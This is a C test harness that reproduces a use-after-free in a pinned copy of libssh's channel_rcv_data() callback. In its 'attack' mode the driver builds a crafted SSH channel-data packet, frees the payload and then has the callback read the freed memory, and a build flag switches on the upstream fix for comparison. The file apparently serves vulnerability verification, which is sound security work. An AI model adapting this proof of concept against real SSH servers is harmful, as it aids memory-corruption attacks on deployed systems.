/*
 * libsshch2shell harness — standalone driver for the pinned
 * channel_rcv_data() from src/channels.c.vuln (a540e276). The callback body is
 * included verbatim from channel_rcv_data.inc; only stand-in declarations,
 * helpers and the attack driver live in this file.
 *
 * Build: see run-all.sh. -D LIBSSH_FIXED adds only the upstream 7-line guard;
 *        -D LIBSSH_PLAIN_PROBE enables the no-ASan dereference print.
 */
#include <arpa/inet.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Stand-in constants: live values are pinned in src/{ssh2.h,libssh.h,channels.h}. */
#define SSH2_MSG_CHANNEL_DATA 94
#define SSH2_MSG_CHANNEL_EXTENDED_DATA 95
#define SSH2_EXTENDED_DATA_STDERR 1
#define SSH_PACKET_USED 1
#define SSH_FATAL 2
#define SSH_ERROR (-1)
#define SSH_CHANNEL_FLAG_CLOSED_REMOTE 0x0001
#define SSH_LOG_FUNCTIONS 1
#define SSH_LOG_PACKET 2
#define SSH_LOG_RARE 3
#define SSH_LOG_WARNING 4

#define CHUNK_LEN 64
#define PAYLOAD_LEN 32
#define MARKER_OFF 16
#define MARKER_TEXT "MISHE-LIBSSH-UAF"

/* Compact stand-in types for the libssh objects the callback touches. */
typedef struct ssh_session_struct {
    int error;
    char error_text[128];
} *ssh_session;

typedef struct ssh_buffer_struct {
    unsigned char *data;
    uint32_t len;
} *ssh_buffer;

typedef struct {
    size_t len;
    unsigned char *data;
} ssh_string_struct;
typedef ssh_string_struct *ssh_string;

typedef struct ssh_counter_struct {
    uint64_t in_bytes;
} *ssh_counter;

typedef struct ssh_channel_struct {
    uint32_t flags;
    uint32_t local_window;
    uint32_t remote_window;
    uint32_t local_channel;
    uint32_t remote_channel;
    ssh_session session;
    ssh_buffer stdout_buffer;
    ssh_buffer stderr_buffer;
    ssh_counter counter;
    int callbacks;
} *ssh_channel;

typedef struct ssh_packet_struct {
    uint32_t type;
    uint32_t recipient_channel;
    uint32_t string_len;
    unsigned char *data; /* points at the heap chunk freed before the call */
    size_t pos;
} ssh_packet_struct;
typedef ssh_packet_struct *ssh_packet;

/* Stand-in macros matching the call shapes in the pinned callback. */
#define SSH_PACKET_CALLBACK(name)                                             \
    static int name(ssh_session session, ssh_packet packet, uint32_t type,     \
                    void *user)
#define SSH_LOG(level, ...) ((void)0)
#define SSH_STRING_FREE(s) do { free(s); (s) = NULL; } while (0)
#define ssh_callbacks_iterate(cb, itype, fn)                                   \
    for (int mi_once = ((cb) != 0); mi_once; mi_once = 0)
#define ssh_callbacks_iterate_exec(fn, ...) ((fn)(__VA_ARGS__))
#define ssh_callbacks_iterate_end() ((void)0)

static uint64_t g_callback_bytes;

static const char *ssh_get_error(ssh_session session)
{
    return session->error_text;
}

static void ssh_set_error(ssh_session session, int level, const char *fmt, ...)
{
    (void)level;
    (void)fmt;
    session->error = SSH_FATAL;
    snprintf(session->error_text, sizeof(session->error_text), "%s",
             "Received data on (remotely) closed channel");
}

static uint32_t ssh_buffer_get_u32(ssh_packet packet, uint32_t *out)
{
    uint32_t raw;
    if (packet->pos + 4 > PAYLOAD_LEN + 12) {
        return 0;
    }
    memcpy(&raw, packet->data + packet->pos, 4);
    packet->pos += 4;
    *out = ntohl(raw);
    return 4;
}

static ssh_string ssh_buffer_get_ssh_string(ssh_packet packet)
{
    ssh_string str = (ssh_string)malloc(sizeof(*str));
    if (str == NULL) {
        return NULL;
    }
    str->len = packet->string_len; /* read from crafted packet header */
    str->data = packet->data;      /* pointer to the freed payload chunk */
    return str;
}

static size_t ssh_string_len(ssh_string str)
{
    return str->len;
}

static unsigned char *ssh_string_data(ssh_string str)
{
    return str->data;
}

static int channel_default_bufferize(ssh_channel channel, void *data,
                                     size_t len, int is_stderr)
{
    ssh_buffer buf = is_stderr ? channel->stderr_buffer : channel->stdout_buffer;
    const unsigned char *src = (const unsigned char *)data;

#ifdef LIBSSH_PLAIN_PROBE
    /* Only in the no-ASan build: print bytes read through the freed pointer. */
    printf("DEREF byte=%c marker=%.*s\n", src[MARKER_OFF],
           (int)strlen(MARKER_TEXT), src + MARKER_OFF);
#endif
    if (buf->len + len > 256) {
        return -1;
    }
    memcpy(buf->data + buf->len, src, len); /* ASan read fault lands here */
    buf->len += (uint32_t)len;
    return 0;
}

static unsigned char *ssh_buffer_get(ssh_buffer buf)
{
    return buf->len > 0 ? buf->data : NULL;
}

static uint32_t ssh_buffer_get_len(ssh_buffer buf)
{
    return buf->len;
}

static void ssh_buffer_pass_bytes(ssh_buffer buf, uint32_t bytes)
{
    if (bytes > buf->len) {
        bytes = buf->len;
    }
    buf->data += bytes;
    buf->len -= bytes;
}

static int channel_data_function(ssh_session session, ssh_channel channel,
                                 unsigned char *data, uint32_t len,
                                 int is_stderr)
{
    (void)session;
    (void)channel;
    (void)is_stderr;
    if (len > PAYLOAD_LEN) {
        len = PAYLOAD_LEN;
    }
    g_callback_bytes += len;
    return (int)len;
}

static ssh_channel g_channel;
static ssh_packet_struct g_packet;
static ssh_session g_session;
static struct ssh_buffer_struct g_out;
static struct ssh_buffer_struct g_err;
static struct ssh_counter_struct g_counter;

static ssh_channel channel_from_msg(ssh_session session, ssh_packet packet)
{
    (void)session;
    if (packet->recipient_channel != 0x00000001U) {
        return NULL;
    }
    return g_channel;
}

static int grow_window(ssh_session session, ssh_channel channel)
{
    (void)session;
    channel->remote_window += PAYLOAD_LEN;
    return 0;
}

#include "channel_rcv_data.inc"

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "attack";
    int attack = strcmp(mode, "attack") == 0;
    unsigned char wire[12 + PAYLOAD_LEN]; /* type | channel | string len | data */
    unsigned char *chunk;
    uint32_t channel_id = htonl(1);
    uint32_t string_len = htonl(PAYLOAD_LEN);
    int rc;

    memset(wire, 0, sizeof(wire));
    wire[0] = SSH2_MSG_CHANNEL_DATA;
    memcpy(wire + 4, &channel_id, 4);
    memcpy(wire + 8, &string_len, 4);

    /* Crafted payload: chosen marker at offset 16 of the string data. */
    chunk = (unsigned char *)malloc(CHUNK_LEN);
    if (chunk == NULL) {
        return 2;
    }
    memset(chunk, 0x41, CHUNK_LEN);
    memcpy(chunk + MARKER_OFF, MARKER_TEXT, strlen(MARKER_TEXT));
    memcpy(wire + 12, chunk, PAYLOAD_LEN);

    /* Emulated reentrant free of the channel data before the callback reads it. */
    if (attack) {
        free(chunk);
    }

    g_session = (ssh_session)calloc(1, sizeof(*g_session));
    g_channel = (ssh_channel)calloc(1, sizeof(*g_channel));
    g_out.data = (unsigned char *)calloc(256, 1);
    g_err.data = (unsigned char *)calloc(256, 1);
    if (g_session == NULL || g_channel == NULL || g_out.data == NULL ||
        g_err.data == NULL) {
        return 2;
    }

    g_channel->flags = attack ? SSH_CHANNEL_FLAG_CLOSED_REMOTE : 0;
    g_channel->local_window = 65536;
    g_channel->remote_window = 65536;
    g_channel->local_channel = 1;
    g_channel->remote_channel = 7;
    g_channel->session = g_session;
    g_channel->stdout_buffer = &g_out;
    g_channel->stderr_buffer = &g_err;
    g_channel->counter = &g_counter;
    g_channel->callbacks = 1;

    g_packet.type = wire[0];
    memcpy(&g_packet.recipient_channel, wire + 4, 4);
    g_packet.recipient_channel = ntohl(g_packet.recipient_channel);
    memcpy(&g_packet.string_len, wire + 8, 4);
    g_packet.string_len = ntohl(g_packet.string_len);
    g_packet.data = chunk;

    rc = channel_rcv_data(g_session, &g_packet, g_packet.type, NULL);
    printf("RESULT mode=%s rc=%d error=%d callback_bytes=%" PRIu64 "\n",
           mode, rc, g_session->error, g_callback_bytes);
    if (!attack) {
        free(chunk);
    }
    return rc > 0 ? 0 : 1;
}
